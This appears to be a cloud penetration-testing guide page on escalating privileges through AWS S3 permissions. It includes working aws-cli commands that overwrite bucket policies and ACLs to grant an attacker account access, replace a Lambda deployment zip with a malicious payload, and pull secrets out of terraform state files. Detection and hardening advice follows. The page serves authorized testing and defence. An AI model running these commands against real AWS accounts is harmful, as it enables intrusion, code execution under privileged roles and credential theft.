---
cstg_id: CSTG-AWS-S3-PRIVESC
title: "AWS S3 - Privilege Escalation"
provider: aws
service: s3
phase: privilege-escalation
required_access: assumed-breach
required_permissions:
  - s3:PutBucketPolicy
  - s3:PutBucketAcl
  - s3:PutObject
  - s3:GetObject
tools: [aws-cli, pacu, cloudfox, pmapper]
references:
  - "https://docs.aws.amazon.com/AmazonS3/latest/userguide/access-policy-language-overview.html"
  - "https://hackingthe.cloud/aws/exploitation/iam_privilege_escalation/"
  - "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
license: CC BY-SA 4.0
---

## Summary

S3 contributes to privilege escalation in two ways: by abusing **S3 control permissions** to widen
access to bucket data, and by abusing **write access to buckets that other systems trust** -
deployment artifacts, infrastructure-as-code, configuration, or scripts that a more-privileged
identity later executes. The second class is the more impactful: overwriting an object can lead to
code execution under another role. This page is keyed by the permission that enables each path,
assuming an initial low-privilege principal (assumed-breach).

## Prerequisites

A principal holding one or more of the permissions below. Confirm the principal's effective
permissions first (see [Enumeration](#enumeration)); attack-path tools such as PMapper or CloudFox
can highlight which buckets are reachable and writable.

## Enumeration

```bash
# What can this principal do, and against which buckets?
aws sts get-caller-identity
aws s3api list-buckets --query 'Buckets[].Name' --output text
# Test write without relying on policy readability:
echo probe | aws s3 cp - s3://<bucket>/cstg-probe.txt   # success => s3:PutObject on bucket
aws s3api get-bucket-policy --bucket <bucket>           # success => s3:GetBucketPolicy
```

Identify buckets consumed by privileged automation - Lambda deployment packages, CloudFormation
templates, CodePipeline artifacts, EC2 user-data/bootstrap scripts, SSM documents, Terraform state.
Write access to those is the high-value target.

## Exploitation

### `s3:PutBucketPolicy`

Overwrite the bucket policy to grant your principal (or everyone) full access to the bucket's data.
The permission to set a policy is sufficient to remove every restriction the policy imposed.

```bash
cat > policy.json <<'JSON'
{"Version":"2012-10-17","Statement":[{"Effect":"Allow",
 "Principal":{"AWS":"arn:aws:iam::<attacker-acct>:user/<you>"},
 "Action":"s3:*","Resource":["arn:aws:s3:::<bucket>","arn:aws:s3:::<bucket>/*"]}]}
JSON
aws s3api put-bucket-policy --bucket <bucket> --policy file://policy.json
```

### `s3:PutBucketAcl`

Where ACLs are still enabled (Object Ownership not `BucketOwnerEnforced`), grant the `AllUsers` or
`AuthenticatedUsers` group, or your canonical ID, read/write on the bucket - an alternative to
PutBucketPolicy for widening access.

```bash
aws s3api put-bucket-acl --bucket <bucket> --grant-full-control id=<your-canonical-id>
```

### `s3:PutObject` on a trusted/deployment bucket (code execution)

The highest-impact path. If a bucket holds artifacts that a privileged identity executes, overwrite
them and wait for (or trigger) execution under that identity:

- **Lambda deployment bucket** - replace the function's `.zip`; on next publish/update the code runs
  under the function's execution role.
- **CloudFormation / CDK / SAM templates** - inject a resource or `AWS::CloudFormation::Init` /
  user-data that runs under the deploying role.
- **EC2 user-data / bootstrap scripts pulled from S3** - overwrite the script; it executes as root
  on next launch with the instance profile's role.
- **SSM documents / automation scripts** - overwrite to run commands on managed instances.
- **Static website / app assets** - overwrite JS/HTML for stored XSS or client-side supply-chain
  compromise.

```bash
aws s3 cp ./malicious_payload.zip s3://<lambda-deploy-bucket>/function.zip
```

### `s3:GetObject` on sensitive buckets (credential access)

Reading the right object yields credentials or state that escalate access directly:

- `terraform.tfstate` / `.tfstate.backup` - frequently contains plaintext secrets, access keys, DB
  passwords.
- `.env`, CI/CD config, backup archives, private keys, kubeconfig.

```bash
aws s3 cp s3://<bucket>/terraform.tfstate - | jq '.. | .secret? // empty'
```

### Related: `s3:PutBucketNotification`, `s3:PutBucketWebsite`

Notification configuration can be pointed at an attacker-controlled Lambda/SNS/SQS to trigger or
exfiltrate on object events; website configuration can redirect a served site. Lower frequency but
in scope when the permission is held.

## Misconfigurations & Findings

- Principals with `s3:PutBucketPolicy` / `s3:PutBucketAcl` outside a tightly controlled admin role.
- Write access (`s3:PutObject`) to deployment, IaC, or bootstrap buckets granted broadly (e.g. via
  `s3:*` or a wildcard resource).
- Deployment buckets without versioning, object-lock, or restrictive policies, so artifacts can be
  silently overwritten.

## Detection & Logging

`PutBucketPolicy` and `PutBucketAcl` are CloudTrail **management events** and should be alerted on
for sensitive buckets. `PutObject` is a **data event** - logged only if S3 data events are enabled
on the trail, so overwrite-for-execution attacks are commonly invisible without that. Correlate a
`PutObject` to a deployment bucket with the subsequent Lambda/CloudFormation/EC2 execution.

## Remediation & Hardening

- Restrict `s3:PutBucketPolicy`/`PutBucketAcl` to a dedicated admin role; deny elsewhere via SCP.
- Lock down deployment/IaC buckets: least-privilege write, **versioning + Object Lock**, and a
  bucket policy that only the CI/CD role can write.
- Set **Object Ownership = Bucket owner enforced** to remove the ACL path entirely.
- Enable **S3 data events** in CloudTrail for sensitive/deployment buckets and alert on writes.
- Keep secrets out of S3 (use Secrets Manager / SSM Parameter Store); never commit state with
  plaintext secrets.

## Tools

- **aws-cli** - perform and verify each path.
- **Pacu** - `s3__*` modules automate bucket enumeration and some abuse paths (active/intrusive -
  requires explicit rules of engagement).
- **CloudFox**, **PMapper** - identify reachable/writable buckets and IAM attack paths from the
  current principal.

## References

- AWS - Bucket policy / access policy language overview
- hackingthe.cloud - IAM privilege escalation
- Rhino Security Labs - AWS privilege escalation methods and mitigation
